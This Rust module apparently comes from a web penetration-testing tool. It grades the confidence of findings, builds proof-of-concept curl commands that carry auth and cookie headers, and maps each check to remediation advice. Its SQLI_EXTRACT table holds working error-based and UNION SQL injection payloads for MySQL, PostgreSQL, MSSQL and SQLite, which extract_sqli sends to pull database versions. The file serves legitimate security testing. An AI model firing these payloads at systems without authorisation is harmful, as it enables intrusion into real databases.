use pentest_core::{Confidence, Finding};
use std::collections::HashMap;

pub fn grade(finding: &Finding) -> Confidence {
    if let Some(c) = finding.confidence {
        return c;
    }
    if !finding.proof.is_empty() {
        return Confidence::Confirmed;
    }
    let text = format!("{} {}", finding.title, finding.detail).to_lowercase();
    let tentative_words = [
        "possible", "behaviour change", "behavior change", "widened", "verify",
        "heuristic", "suspicious", "worth confirming", "may", "surface",
    ];
    // word-boundaried check for "surface" so "surfaced" doesn't match
    let is_tentative = tentative_words.iter().any(|w| {
        if *w == "surface" || *w == "may" {
            text.split_whitespace().any(|word| word.trim_matches(|c: char| !c.is_alphanumeric()) == *w)
        } else {
            text.contains(w)
        }
    });
    if is_tentative {
        return Confidence::Tentative;
    }
    let confirmed_words = [
        "error-based", "time-based", "in-band", "evaluated", "reflected",
        "confirmed", "read /etc", "external entity", "introspection",
        "alg=none", "enabled", "exposed",
    ];
    if confirmed_words.iter().any(|w| text.contains(w)) {
        return Confidence::Confirmed;
    }
    Confidence::Firm
}

pub fn poc_curl(finding: &Finding, headers: &HashMap<String, String>) -> String {
    if finding.url.is_empty() || finding.param.is_empty() {
        return String::new();
    }
    let payload = if finding.payload.is_empty() { "FUZZ" } else { &finding.payload };
    let mut hdr = String::new();
    for (k, v) in headers {
        let lk = k.to_lowercase();
        if lk == "authorization" || lk == "cookie" {
            hdr.push_str(&format!(" -H {}", shell_quote(&format!("{k}: {v}"))));
        }
    }
    if finding.method.eq_ignore_ascii_case("POST") {
        let base = finding.url.split('?').next().unwrap_or(&finding.url);
        return format!(
            "curl -sS{hdr} -d {} {}",
            shell_quote(&format!("{}={}", finding.param, payload)),
            shell_quote(base)
        );
    }
    let base = finding.url.split('?').next().unwrap_or(&finding.url);
    let q = url_encode_pair(&finding.param, payload);
    format!("curl -sS{hdr} {}", shell_quote(&format!("{base}?{q}")))
}

fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

fn url_encode_pair(k: &str, v: &str) -> String {
    format!("{}={}", urlencode(k), urlencode(v))
}

fn urlencode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

const SQLI_EXTRACT: &[(&str, &str, &str)] = &[
    ("MySQL/MariaDB extractvalue", "{b}' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -", r"~([\w.\-+]+)~?"),
    ("MySQL/MariaDB updatexml", "{b}' AND updatexml(1,concat(0x7e,version(),0x7e),1)-- -", r"~([\w.\-+]+)~?"),
    ("PostgreSQL cast error", "{b}' AND 1=CAST(version() AS int)-- -", r#"(PostgreSQL [\d.]+[^\s"'<]*)"#),
    ("MSSQL convert error", "{b}' AND 1=CONVERT(int,@@version)-- -", r"(Microsoft SQL Server[^<\n\x22']{0,60})"),
    ("SQLite", "{b}' AND 1=likelihood(sqlite_version(),1)-- -", r"(\d+\.\d+\.\d+)"),
    ("UNION version", "{b}' UNION SELECT sqlite_version()-- -", r"(\d+\.\d+\.\d+)"),
];

pub fn extract_sqli<F>(send: F, base_value: &str) -> String
where
    F: Fn(&str) -> String,
{
    let b = if base_value.is_empty() { "1" } else { base_value };
    for (label, tmpl, pattern) in SQLI_EXTRACT {
        let payload = tmpl.replace("{b}", b);
        let body = send(&payload);
        if let Ok(re) = regex::Regex::new(pattern) {
            if let Some(caps) = re.captures(&body) {
                if let Some(m) = caps.get(1) {
                    if m.as_str().chars().any(|c| c.is_ascii_digit()) {
                        return format!("DBMS version extracted: {}  (via {label})", m.as_str());
                    }
                }
            }
        }
    }
    String::new()
}

pub fn remediation_for(check_name: &str) -> &'static str {
    match check_name {
        "sqli" => "Use parameterized queries / prepared statements; never build SQL by string concatenation.",
        "nosqli" => "Cast/validate input types; reject query operators ($ne,$gt,$where) in user input.",
        "cmdi" => "Avoid shells; use exec with an argument array and an allow-list — never interpolate input.",
        "ssti" => "Never render user input as a template; use a sandboxed engine and pass data as context only.",
        "traversal" => "Canonicalize paths and confine to a base dir (realpath + prefix check); never pass input to file APIs.",
        "xxe" => "Disable external entities and DOCTYPE in the XML parser (FEATURE_SECURE_PROCESSING / disallow-doctype-decl).",
        "crlf" => "Strip CR/LF from any user data placed in response headers; use framework header APIs.",
        "xss" => "Context-encode output (HTML/attr/JS/URL) and set a strict Content-Security-Policy.",
        "ldap_injection" => "Escape LDAP special chars (RFC 4515) or use parameterized LDAP APIs.",
        "xpath_injection" => "Use parameterized XPath / precompiled expressions; escape or reject quotes.",
        "ssrf" => "Allow-list outbound hosts, block link-local/metadata ranges, disable unused URL schemes.",
        "redirect" => "Allow-list redirect targets or use server-side mapping keys, not raw URLs.",
        "host_header" => "Validate Host against an allow-list; build absolute URLs from configuration, not the request.",
        "csrf" => "Add per-request anti-CSRF tokens and SameSite=Lax/Strict cookies.",
        "cors_advanced" => "Reflect only explicitly allow-listed origins; never combine wildcard/null with credentials.",
        "clickjacking" => "Set CSP frame-ancestors 'none' (or 'self') and X-Frame-Options: DENY.",
        "method_tampering" => "Disable WebDAV/TRACE; enforce method-based authz server-side; ignore override headers.",
        "cache_deception" => "Cache by content-type/route, not extension; mark private pages no-store.",
        "graphql" => "Disable introspection and the IDE in production; enforce query depth/cost limits.",
        "jwt" => "Pin the algorithm server-side, reject 'none', enforce exp, keep secrets strong.",
        "info_disclosure" => "Disable debug/verbose errors in prod; strip stack traces and secrets from responses.",
        "secrets_in_js" => "Remove secrets from client bundles; rotate exposed keys; use a backend proxy.",
        "idor" => "Enforce object-level authorization on every request (check the object belongs to the caller).",
        "content_discovery" => "Remove or auth-gate exposed admin/backup/debug endpoints.",
        "headers" => "Add the missing security headers (CSP, HSTS, X-Content-Type-Options, etc.).",
        "recon" => "Suppress version banners; disable unneeded HTTP methods; keep TLS modern.",
        "auth_bruteforce" => "Add rate limiting + lockout/CAPTCHA and uniform error messages to prevent enumeration.",
        "files" => "Remove or block access to exposed sensitive files; disable directory listing.",
        "cve-match" => "Upgrade the affected component to a fixed version.",
        _ => "",
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use pentest_core::Severity;

    #[test]
    fn grade_returns_confirmed_when_proof_present() {
        let mut f = Finding::new("sqli", Severity::Critical, "t", "d");
        f.proof = "DBMS version extracted: 8.0.32".to_string();
        assert_eq!(grade(&f), Confidence::Confirmed);
    }

    #[test]
    fn grade_returns_tentative_for_hedged_language() {
        let f = Finding::new("idor", Severity::Medium, "Possible IDOR", "worth confirming manually");
        assert_eq!(grade(&f), Confidence::Tentative);
    }

    #[test]
    fn grade_does_not_treat_surfaced_as_surface() {
        let f = Finding::new("sqli", Severity::Critical, "Error-based SQL injection", "payload surfaced a DB error");
        assert_eq!(grade(&f), Confidence::Confirmed);
    }

    #[test]
    fn grade_falls_back_to_firm() {
        let f = Finding::new("headers", Severity::Medium, "Missing X-Frame-Options", "no clickjacking protection");
        assert_eq!(grade(&f), Confidence::Firm);
    }

    #[test]
    fn poc_curl_builds_get_request_with_param() {
        let mut f = Finding::new("sqli", Severity::Critical, "t", "d");
        f.url = "http://x.test/item?id=1".to_string();
        f.param = "id".to_string();
        f.method = "GET".to_string();
        f.payload = "1'".to_string();
        let poc = poc_curl(&f, &HashMap::new());
        assert!(poc.contains("curl -sS"));
        assert!(poc.contains("http://x.test/item?"));
        assert!(poc.contains("id=1%27"));
    }

    #[test]
    fn poc_curl_returns_empty_without_url_or_param() {
        let f = Finding::new("recon", Severity::Info, "t", "d");
        assert_eq!(poc_curl(&f, &HashMap::new()), "");
    }

    #[test]
    fn extract_sqli_finds_mysql_version_via_extractvalue() {
        let result = extract_sqli(
            |_payload| "XPATH syntax error: '~8.0.32-MariaDB~'".to_string(),
            "1",
        );
        assert!(result.contains("8.0.32-MariaDB"));
        assert!(result.contains("extractvalue"));
    }

    #[test]
    fn extract_sqli_returns_empty_when_nothing_matches() {
        let result = extract_sqli(|_payload| "no error here".to_string(), "1");
        assert_eq!(result, "");
    }

    #[test]
    fn remediation_for_known_check_is_non_empty() {
        assert!(!remediation_for("sqli").is_empty());
        assert!(!remediation_for("recon").is_empty());
        // A matched real CVE finding must render with a non-empty
        // remediation field too, like every other check.
        assert!(!remediation_for("cve-match").is_empty());
    }

    #[test]
    fn remediation_for_unknown_check_is_empty() {
        assert_eq!(remediation_for("not-a-real-check"), "");
    }
}
